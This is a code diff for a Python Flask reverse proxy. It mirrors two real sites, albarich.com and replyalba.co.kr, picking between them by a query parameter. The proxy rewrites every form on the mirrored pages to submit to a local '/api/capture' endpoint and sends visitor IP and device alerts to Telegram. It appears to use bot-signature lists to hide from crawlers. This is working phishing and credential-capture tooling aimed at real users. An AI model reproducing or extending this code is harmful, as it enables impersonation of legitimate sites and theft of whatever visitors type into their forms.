@@ -43,7 +43,8 @@ CPA_DATA = {
     "20186798": ["알곤출장용접", "SROHH97olh"], "ef310430": ["스텐 출장용접", "SROHH97olh"]
 }
 
-BASE_TARGET = "https://albarich.com"
+TARGET_A = "https://albarich.com"
+TARGET_B = "https://replyalba.co.kr"
 BOT_SIGS = ['naver', 'yeti', 'bot', 'crawl', 'google', 'spider', 'ahrefs', 'bing']
 FORBIDDEN_PATHS = ['admin', '.env', 'wp-login', 'config', 'shell', 'backup']
 REGIONS = ['us-east-1', 'ap-northeast-2', 'eu-west-1', 'sa-east-1', 'ap-southeast-1']
@@ -489,12 +490,16 @@ def proxy_master_final(path):
             msg = f"💰 [{kw}] � {ip} | {device} | 🔗 {domain_clean}"
             send_telegram(msg)
 
-        target_url = f"{BASE_TARGET}/pt/{CPA_DATA[k][1]}" if k in CPA_DATA and not path else f"{BASE_TARGET}/{path}" if path else f"{BASE_TARGET}/pt/z2NytCt42i"
+        # [Dual Target Routing]
+        t_param = request.args.get('t', 'A')
+        base_target = TARGET_B if t_param == 'B' else TARGET_A
         
-        t_resp = requests.get(target_url, params=request.args, headers={'User-Agent': request.headers.get('User-Agent'), 'Referer': BASE_TARGET}, timeout=12)
+        target_url = f"{base_target}/pt/{CPA_DATA[k][1]}" if k in CPA_DATA and not path else f"{base_target}/{path}" if path else f"{base_target}/pt/z2NytCt42i"
+        
+        t_resp = requests.get(target_url, params=request.args, headers={'User-Agent': request.headers.get('User-Agent'), 'Referer': base_target}, timeout=12)
         f_resp = make_response()
         if "text/html" in t_resp.headers.get("Content-Type", ""):
-            html = re.sub(r'(src|href|action)="/', r'\1="https://albarich.com/', t_resp.text)
+            html = re.sub(r'(src|href|action)="/', f'\\1="{base_target}/', t_resp.text)
             html = re.sub(r'<form([^>]*)action="[^"]*"', r'<form\1action="/api/capture" method="POST"', html)
             f_resp.set_data(html)
         else:
